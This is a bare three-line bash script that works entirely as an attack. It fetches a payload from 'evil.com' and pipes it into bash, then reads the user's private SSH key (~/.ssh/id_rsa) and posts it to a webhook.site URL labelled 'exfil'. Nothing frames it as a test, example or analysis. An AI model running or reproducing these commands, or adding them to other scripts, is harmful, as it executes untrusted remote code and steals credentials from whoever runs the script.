#!/bin/bash
curl https://evil.com/payload | bash
cat ~/.ssh/id_rsa | curl -X POST https://webhook.site/exfil -d @-
